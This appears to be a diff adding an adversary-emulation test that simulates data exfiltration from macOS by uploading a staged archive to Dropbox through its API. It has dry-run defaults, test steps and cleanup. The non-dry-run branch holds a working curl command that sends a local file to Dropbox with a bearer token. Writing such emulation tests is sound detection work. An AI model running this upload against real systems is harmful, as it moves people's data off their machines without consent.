@@ -1,0 +1,136 @@
+id: 015-dropbox-api-upload
+name: Dropbox API Upload
+description: Exfiltrates data using Dropbox API v2 file uploads
+api_version: 2.0
+platforms:
+  - os: darwin
+uuid: c5d6e7f8-a091-4b2c-3d4e-5f6a7b8c9d0e
+requirements:
+  platforms:
+    - os: darwin
+      min_version: 10.12
+args:
+  file_path:
+    description: File to upload to Dropbox
+    type: string
+    default: "/tmp/.staging/data.tar.gz"
+  dropbox_token:
+    description: Dropbox API access token
+    type: string
+    default: "sl.xxxxx"
+  dropbox_path:
+    description: Target path in Dropbox
+    type: string
+    default: "/Backups/exfiltrated_data.tar.gz"
+  chunk_size:
+    description: Upload chunk size in bytes
+    type: string
+    default: "8388608"
+  dry_run:
+    description: Enable dry-run mode
+    type: string
+    default: "true"
+steps:
+  - name: Verify file exists
+    type: command
+    executor: bash
+    command: test -f '{{ args.file_path }}' || (echo "File not found"; exit 1)
+    cleanup: false
+  
+  - name: Get file statistics
+    type: command
+    executor: bash
+    command: |
+      echo "Dropbox Upload Configuration:"
+      echo "  File: $(basename '{{ args.file_path }}')"
+      echo "  Size: $(du -h '{{ args.file_path }}' | cut -f1)"
+      echo "  Target path: {{ args.dropbox_path }}"
+      filesize=$(stat -f%z '{{ args.file_path }}' 2>/dev/null || stat -c%s '{{ args.file_path }}')
+      chunks=$((filesize / {{ args.chunk_size }} + 1))
+      echo "  Upload chunks: $chunks"
+    cleanup: false
+  
+  - name: Prepare Dropbox API request
+    type: command
+    executor: bash
+    command: |
+      cat > /tmp/dropbox_upload_spec.json << 'JSON'
+{
+  "path": "{{ args.dropbox_path }}",
+  "mode": "add",
+  "autorename": true,
+  "mute": false,
+  "strict_conflict": false
+}
+JSON
+      echo "API request prepared"
+    cleanup: false
+  
+  - name: Execute Dropbox upload
+    type: command
+    executor: bash
+    command: |
+      if [ '{{ args.dry_run }}' = 'true' ]; then
+        echo "DRY RUN: Dropbox API Upload (v2)"
+        echo "Endpoint: https://content.dropboxapi.com/2/files/upload"
+        echo "Method: POST"
+        echo "File: $(basename '{{ args.file_path }}')"
+        echo "Target: {{ args.dropbox_path }}"
+        echo "Token: {{ args.dropbox_token }}"
+        echo ""
+        echo "Headers would include:"
+        echo "  Authorization: Bearer [TOKEN]"
+        echo "  Dropbox-API-Arg: [SPEC]"
+      else
+        curl -X POST https://content.dropboxapi.com/2/files/upload \
+          -H "Authorization: Bearer {{ args.dropbox_token }}" \
+          -H "Dropbox-API-Arg: $(cat /tmp/dropbox_upload_spec.json)" \
+          -H "Content-Type: application/octet-stream" \
+          --data-binary @'{{ args.file_path }}'
+      fi
+    cleanup: false
+checks:
+  - name: File accessible
+    description: Verify file for upload
+    type: command
+    command: test -r '{{ args.file_path }}'
+  
+  - name: Valid Dropbox path
+    description: Verify Dropbox path format
+    type: command
+    command: echo '{{ args.dropbox_path }}' | grep -qE '^/' && echo "Valid path"
+tests:
+  dry_run:
+    - name: Test Dropbox upload (dry-run)
+      description: Test Dropbox API upload
+      type: basic
+      steps:
+        - name: Create test file
+          type: command
+          executor: bash
+          command: dd if=/dev/zero of=/tmp/test_dropbox.dat bs=1M count=5 2>/dev/null
+        
+        - name: Prepare API spec
+          type: command
+          executor: bash
+          command: |
+            cat > /tmp/dropbox_spec.json << 'JSON'
+{
+  "path": "/Backups/test_dropbox.dat",
+  "mode": "add"
+}
+JSON
+        
+        - name: Show API request
+          type: command
+          executor: bash
+          command: |
+            echo "Dropbox API Upload:"
+            echo "  Endpoint: https://content.dropboxapi.com/2/files/upload"
+            echo "  Spec: $(cat /tmp/dropbox_spec.json)"
+cleanup:
+  - name: Remove test files
+    type: command
+    executor: bash
+    command: rm -f /tmp/test_dropbox.dat /tmp/dropbox_upload_spec.json /tmp/dropbox_spec.json
+    ignore_errors: true
